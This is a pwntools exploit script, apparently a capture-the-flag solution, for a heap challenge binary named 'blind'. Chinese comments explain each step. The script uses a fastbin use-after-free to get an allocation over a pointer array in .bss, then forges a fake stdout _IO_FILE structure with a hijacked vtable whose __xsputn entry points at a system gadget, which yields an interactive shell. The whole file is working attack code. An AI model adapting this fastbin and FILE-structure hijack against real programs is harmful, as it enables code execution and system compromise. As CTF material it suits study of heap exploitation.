from pwn import *

context.log_level = 'debug'
p = process("./blind")

bss_stdout = 0x602020 
ptr_addr = 0x602060
sys_addr = 0x4008E3
def new(idx,content):
	p.recvuntil("Choice:")
	p.sendline("1")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.recvuntil("Content:")
	p.send(content)
def change(idx,content):
	p.recvuntil("Choice:")
	p.sendline("2")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.recvuntil("Content:")
	p.send(content)
def release(idx):
	p.recvuntil("Choice:")
	p.sendline("3")
	p.recvuntil("Index:")
	p.sendline(str(idx))

if __name__=='__main__': 
	content = 'A'*8+'\n'
	new(0,content)
	new(1,content)
	new(2,content)

	release(0)
	change(0,p64(0x60203d)+'\n') #构造一个size为0x7f的fastbin，来绕过判断，申请到.bss上的ptr数组
	new(3,content)
	payload = 'a'*0x13 + p64(0x602020)+p64(0x602090)+p64(0x602090+0x68)+p64(0x602090+0x68*2)+p64(0x602090+0x68*3)+'\n'
	new(4,payload) #     ----chunk 0--------chunk1--------chunk2-------------chunk3---------------chunk4 伪造ptr数组的内容
 
    #伪造stdout的_IO_2_1_stdout_结构，保存在0x602090处 sizeof(struct _IO_FILE_plus)=0xe0,sizeof(struct _IO_FILE)=0xd8 = 0x68+0x68+0x8 
	payload = p64(0xfbad8000)+p64(0)*12 
	change(1,payload) #第一个0x68
	payload = p64(0)+p64(0x1)+p64(0xffffffffffffffff)+p64(0)*2+p64(0xffffffffffffffff)+p64(0)*5+p64(0xffffffff)+p64(0)
	change(2,payload) #第一个0x68
	payload = p64(0) + p64(0x602090+0x68*3)+'\n' #所以vtable表的位置在偏移0xd8处
	change(3,payload)
	payload = p64(0)*7+p64(sys_addr)+'\n' #伪造vtable表中__xsputn函数地址为system地址
	change(4,payload)

	change(0,p64(0x602090)+'\n') #将.bss保存的stdout的地址改为伪造的地址0x602090

	
	p.interactive()
